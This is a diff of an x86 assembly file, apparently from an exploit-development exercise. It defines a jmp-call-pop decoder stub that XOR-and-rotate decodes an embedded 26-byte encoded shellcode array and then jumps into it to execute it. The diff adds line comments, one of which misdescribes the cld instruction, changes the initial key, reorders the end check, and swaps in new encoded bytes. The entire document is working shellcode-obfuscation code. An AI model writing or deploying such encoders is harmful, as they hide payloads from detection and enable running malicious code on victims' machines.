@@ -6,23 +6,23 @@
 global _start
 section .text
 _start:
-  cld
-  mov dl, 0xff
-  push edx
-  jmp call_decoder
+  cld				; zero out edx
+  mov dl, 0x2c			; initialisation vector used to find end of encoded shellcode
+  push edx			;  and used as initial xor key
+  jmp call_decoder		; jmp / call/ pop
 decoder:
-  pop esi
-  pop eax
+  pop esi			; jmp, call, pop
+  pop eax			; use key as initial xor vector
 decode:
-  mov byte cl,[esi]
-  xor byte [esi], al
-  mov al, byte [esi]
-  add ecx, edx
-  ror al, cl
-  cmp byte [esi], dl
-  jz shellcode
-  inc esi
-  jmp short decode
+  mov byte cl,[esi]		; encoded byte will define no of ror rotations of key for next xor
+  xor byte [esi], al		; xor current byte with vector
+  cmp byte [esi], dl		; have we decoded the end of shellcode string?
+  jz shellcode			; if so, execute the shellcode
+  mov al, byte [esi]		; decrypted byte will be the base for rotation to get key for next xor
+  add ecx, edx			; add initial key to ecx
+  ror al, cl			; rotate decrypted left byte times (encrypted left byte * initialisation vector)
+  inc esi			; move to the next byte
+  jmp short decode		; loop until entire shellcode is decoded
 call_decoder:
-  call decoder
-shellcode: db 0xce,0x49,0x90,0xc8,0xff,0x93,0xb8,0x8e,0x2b,0x35,0x90,0xad,0xf8,0x55,0x7b,0xa8,0x29,0x6b,0xeb,0x5d,0x79,0x51,0xbb,0x0f,0xb7,0xfd
+  call decoder			; jmp / call / pop
+shellcode: db 0x1d,0x58,0x5c,0x38,0xa9,0x56,0xb8,0x5f,0x65,0x1b,0x3c,0x0b,0xbc,0xe7,0xd2,0xdf,0x83,0xf1,0x44,0xda,0xc7,0x8c,0xbb,0xdb,0x1b,0x2d
